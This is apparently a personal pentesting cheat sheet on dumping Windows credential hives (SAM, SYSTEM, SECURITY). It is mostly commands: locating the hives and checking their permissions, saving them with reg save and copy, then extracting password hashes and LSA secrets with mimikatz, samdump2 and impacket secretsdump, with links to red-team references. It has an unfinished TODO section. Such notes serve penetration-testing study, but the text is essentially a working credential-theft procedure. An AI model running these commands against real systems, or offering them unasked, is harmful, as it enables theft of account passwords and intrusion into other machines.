# Living off the Land

## 1.1 - Dumping SAM hashes manually

### 1.1.1 - Common Windows hive files locations

```
C:\Windows\System32\config\SECURITY
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SAM
C:\Windows\Repair\SAM
C:\Windows\Repair\SYSTEM
```

### 1.1.2 - Gather hive files locations

#### 1.1.2.1 - Command Prompt

```
C:\> dir /s /b SECURITY

C:\> dir /s /b SYSTEM

C:\> dir /s /b SAM
```

#### 1.1.2.2 - Powershell

```
PS C:\> Get-ChildItem -Path C:\ -Recursive -Include SECURITY,SYSTEM,SAM
```

### 1.1.3 - Enumerate hive files

#### 1.1.3.1 - Command Prompt

```
C:\> icacls C:\Windows\System32\config\SECURITY
C:\> icacls C:\Windows\System32\config\SYSTEM
C:\> icacls C:\Windows\System32\config\SAM
C:\> icacls C:\Windows\Repair\SAM
C:\> icacls C:\Windows\Repair\SYSTEM
```

If it was misconfigured that the users are allowed to access `BUILTIN\Users:(I)(RX)` to those sensitive credentials files or it could be on a particular user that was configured that allows it to access when it's the admin has the privileges.

#### 1.1.3.2 - Powershell

TODO: Fill this info

```
PS C:\> Get-ChildItem -Path C:\ -Recursive -Include SECURITY,SYSTEM,SAM | Get-ACL
```

### 1.1.4 - Save the hashes via `registry`

```
C:\> reg save hklm\security c:\temp\security
reg save hklm\system c:\temp\system
reg save hklm\sam c:\temp\sam
```

### 1.1.5 - Use the `copy` command

```
C:\> copy C:\Windows\System32\config\SAM c:\temp\sam

C:\> copy C:\Windows\System32\config\SYSTEM c:\temp\system
```

### 1.1.6 - Hashdump

#### 1.1.6.1 - Dumping SAM credentials with `mimikatz`

`mimikatz # lsadump::sam /system:c\:temp\system /sam:c:\temp\sam`

#### 1.1.6.2 - Dumping SAM credentials with `samdump2`

Note: This works for older operating systems to Windows 8.1. It is recommend that you use [[#^ab4c64|impacket secretsdump]] for latest windows versions.

`$ samdump2 system sam -o hashdump.txt`

#### 1.1.6.3 - Dumping SAM credentials with `secretsdump`

^ab4c64

Instead of storing the hashes on the compromised target use the **File Transfer techniques.** Once that the process is done we can dump the hashes using one of the impacket scripts called `secretsdump`.

The syntax for `secretsdump` is:

`$ secretsdump -sam sam -system system local`

`$ secretsdump -sam sam -security security -system system local`

### 1.1.7 - LSASS Secrets

#### 1.1.7.1 - Dumping LSASS secrets credentials with `mimikatz`

`mimikatz # lsadump::secrets /system:c\:temp\system /security:c:\temp\security`

---
## References

- [Samdump2](https://salsa.debian.org/pkg-security-team/samdump2)

- [Red Team Notes: Dumping Hashes from SAM via Registry](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)

- [Credential Access and Credential Dumping: Dumping LSA Secrets](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)

- [Credential Access and Credential Dumping: Dumping and Cracking MSCash Cached Domain Credentials](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)

- [Hacking Articles: Credential Dumping SAM](https://www.hackingarticles.in/credential-dumping-sam/)

- [Wadcoms Impacket Secretsdump](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/)